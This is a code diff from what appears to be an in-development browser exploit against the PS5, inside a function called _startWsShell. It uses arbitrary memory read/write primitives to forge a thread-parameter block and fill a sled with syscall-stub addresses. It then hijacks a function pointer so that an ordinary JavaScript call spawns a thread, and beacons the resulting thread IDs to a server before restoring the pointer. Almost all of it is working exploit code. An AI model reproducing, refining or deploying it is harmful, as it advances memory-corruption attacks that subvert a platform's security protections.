@@ -5770,29 +5770,26 @@ function _startWsShell(){
           TW('5 idx='+idx+' text=0x'+txt.toString(16)+' target=0x'+target.toString(16));
           reply.idx=idx;
           reply.text='0x'+txt.toString(16);
-          /* BUILD THE PARAM at fakeScope (0x50 bytes) - v2 THE NANOSLEEP PARK:
-           * +0x00 start_func = THE NANOSLEEP STUB (msg.nap or the
-           * interpolated 0x8B0 default) - the child calls
-           * nanosleep(&{tv_sec=0x7FFFFFFF}) and BLOCKS IN THE KERNEL
-           * for 68 years. NO userland execution, NO crash, the
-           * parent posts the reply at leisure. Fallback: a small
-           * thr_self-stub sled on the same 16KB page as the scope
-           * (committed - no more viewBase+0x100000 fills, the tw-20
-           * fill died on an uncommitted cage page). */
-          var thrStub=B+0x2C0n;                    /* the PROVEN thr_self stub (the fallback sled entry) */
-          var napRva=parseInt(msg.nap)||0x8B0;      /* the nanosleep stub RVA (nap-tested) */
-          var napStub=B+BigInt(napRva);
-          var tsPtr=S.fakeScope+0x200n;             /* the crafted timespec */
+          /* BUILD THE PARAM at fakeScope (0x50 bytes) - v2.5 THE #16 SLED RACE:
+           * umtx_op on PS5 is the 5-ARG form (op in RSI = cfr ->
+           * EINVAL) - no one-arg park exists among the identified
+           * stubs. DESIGN: the child's start_func = the #16 stub
+           * (0x7A0 - PROVEN harmless instant syscall, zero writes),
+           * the sled = 12KB of #16 entries on the scope's OWN 16KB
+           * page (committed). The child spins ~1.5ms; the parent's
+           * FIRST post-call action = the combined witness beacon
+           * (tid values in the beacon string - banked server-side
+           * even if the child's eventual crash wins the race). */
+          var spinRva=parseInt(msg.nap)||0x7A0;     /* the sled entry: the #16 proven-harmless stub */
+          var spinStub=B+BigInt(spinRva);
+          var argBuf=S.fakeScope+0x300n;            /* the child's RDI (scratch - #16 writes nothing) */
           var tidOut=S.fakeScope+0x180n;           /* child_tid target */
           var parOut=S.fakeScope+0x188n;           /* parent_tid target */
           var stackBase=S.fakeScope+0x400n;        /* the sled: same 16KB page as the scope = committed */
-          var stackSize=0x3000;                     /* 12KB = 1536 fallback entries */
-          TW('6 building param nap=0x'+napStub.toString(16));
-          /* the timespec: 68 years */
-          S.absWrite(tsPtr,0x7FFFFFFFn);
-          S.absWrite(tsPtr+8n,0n);
-          S.absWrite(S.fakeScope+0x00n,napStub);   /* start_func = nanosleep */
-          S.absWrite(S.fakeScope+0x08n,tsPtr);     /* arg = &timespec */
+          var stackSize=0x3000;                     /* 12KB = 1536 spin entries */
+          TW('6 building param spin=0x'+spinStub.toString(16));
+          S.absWrite(S.fakeScope+0x00n,spinStub);  /* start_func = the #16 stub */
+          S.absWrite(S.fakeScope+0x08n,argBuf);     /* arg = scratch */
           S.absWrite(S.fakeScope+0x10n,stackBase);
           S.absWrite(S.fakeScope+0x18n,BigInt(stackSize));
           S.absWrite(S.fakeScope+0x20n,0n);         /* tls_base = 0 (56l-proven) */
@@ -5804,10 +5801,11 @@ function _startWsShell(){
           /* zero the witness buffers */
           S.absWrite(tidOut,0n);
           S.absWrite(parOut,0n);
-          /* THE FALLBACK SLED (small, committed page) */
+          S.absWrite(argBuf,0n);
+          /* THE SLED */
           var fillN=Math.floor(stackSize/8);
           for(var fi=0;fi<fillN;fi++){
-            S.absWrite(stackBase+BigInt(fi*8),thrStub);
+            S.absWrite(stackBase+BigInt(fi*8),spinStub);
           }
           TW('7 sled filled n='+fillN);
           /* THE CALL: RDI = fakeScope (the param), RSI = cfr (huge size).
@@ -5817,18 +5815,18 @@ function _startWsShell(){
           S.absWrite(S.neEntry.addr+0x28n,target);
           TW('9 CALLING');
           try{Math.round(-5.7);}catch(e){}
-          S.absWrite(S.neEntry.addr+0x28n,origFnR);
-          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
-          TW('10 RETURNED');
-          /* THE WITNESS READ (beacon FIRST - banks even if the child
-           * crash races the reply post) */
+          /* THE WITNESS READ FIRST - the child spin gives ~1.5ms;
+           * the tid read (µs) + ONE combined beacon (~1ms) banks the
+           * witness server-side even if the child crash beats the
+           * reply post. THEN restore + reply. */
           var ct=S.absRead(tidOut,8)[0];
           var pt2=S.absRead(parOut,8)[0];
-          var ab=S.absRead(argBuf,8)[0];
-          TW('11 child_tid=0x'+ct.toString(16)+' parent_tid=0x'+pt2.toString(16)+' argbuf=0x'+ab.toString(16));
+          TW('10 TID child=0x'+ct.toString(16)+' parent=0x'+pt2.toString(16));
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          TW('11 RESTORED');
           reply.child_tid='0x'+ct.toString(16);
           reply.parent_tid='0x'+pt2.toString(16);
-          reply.argbuf='0x'+ab.toString(16);
           reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
         }catch(e2){reply.err='tw fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
